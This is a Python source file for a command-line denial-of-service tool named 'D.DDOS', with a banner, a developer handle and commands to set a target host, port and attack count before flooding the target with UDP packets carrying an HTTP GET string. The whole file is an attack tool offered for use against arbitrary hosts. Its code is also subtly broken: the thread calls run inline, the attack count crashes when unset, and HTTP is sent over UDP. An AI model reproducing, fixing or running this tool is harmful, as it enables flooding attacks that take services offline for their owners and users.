import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style

class SockFlood:
	def __init__(self):
		os.system("cls")
		os.system("title D.DDOS - An Advance DDOS Tool ")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""                                                                                                                                                                                                                
DDDDDDDDDDDDD        YYYYYYY       YYYYYYYLLLLLLLLLLL                    444444444  NNNNNNNN        NNNNNNNN
D::::::::::::DDD     Y:::::Y       Y:::::YL:::::::::L                   4::::::::4  N:::::::N       N::::::N
D:::::::::::::::DD   Y:::::Y       Y:::::YL:::::::::L                  4:::::::::4  N::::::::N      N::::::N
DDD:::::DDDDD:::::D  Y::::::Y     Y::::::YLL:::::::LL                 4::::44::::4  N:::::::::N     N::::::N
  D:::::D    D:::::D YYY:::::Y   Y:::::YYY  L:::::L                  4::::4 4::::4  N::::::::::N    N::::::N
  D:::::D     D:::::D   Y:::::Y Y:::::Y     L:::::L                 4::::4  4::::4  N:::::::::::N   N::::::N
  D:::::D     D:::::D    Y:::::Y:::::Y      L:::::L                4::::4   4::::4  N:::::::N::::N  N::::::N
  D:::::D     D:::::D     Y:::::::::Y       L:::::L               4::::444444::::444N::::::N N::::N N::::::N
  D:::::D     D:::::D      Y:::::::Y        L:::::L               4::::::::::::::::4N::::::N  N::::N:::::::N
  D:::::D     D:::::D       Y:::::Y         L:::::L               4444444444:::::444N::::::N   N:::::::::::N
  D:::::D     D:::::D       Y:::::Y         L:::::L                         4::::4  N::::::N    N::::::::::N
  D:::::D    D:::::D        Y:::::Y         L:::::L         LLLLLL          4::::4  N::::::N     N:::::::::N
DDD:::::DDDDD:::::D         Y:::::Y       LL:::::::LLLLLLLLL:::::L          4::::4  N::::::N      N::::::::N
D:::::::::::::::DD       YYYY:::::YYYY    L::::::::::::::::::::::L        44::::::44N::::::N       N:::::::N
D::::::::::::DDD         Y:::::::::::Y    L::::::::::::::::::::::L        4::::::::4N::::::N        N::::::N
DDDDDDDDDDDDD            YYYYYYYYYYYYY    LLLLLLLLLLLLLLLLLLLLLLLL        4444444444NNNNNNNN         NNNNNNN                                                                                            
		"""
		print(Fore.RED+banner)
		print(Fore.YELLOW+"""
		[+] An Advance DDOS Tool Using Sockets Written in Python [+]"""+Fore.GREEN+"""
		[+] Developer : DYL4N#0552 [ """+Fore.WHITE+"""s1ralt ]""")
		print(Fore.WHITE+"""
		[+] Type `help` If You Are A Beginner [+]
			""")

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[+] Sent Byte Successfully""")
		except Exception as e:
			print(Fore.RED+f"""
	[-] Socket ERROR! Fatal X_X
	[-] EXCEPTION : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Fore.WHITE+"""
	Welcome To D.DDOS Help Menu - 

	(+) host %HOST% - Enter the Host Domain or Ip Address [!Required]
	(+) port %PORT% - Enter a custom port if you have, or just don't use it will use port 80
	(+) attacks %AMOUNT% - Enter a custom amount of attack, Default 1000
	(+) start - Will start attacking and display outputs on console
	""")
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[+] Successfully Set Host as {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Port to {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[+] Successfully Set Threads to {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()
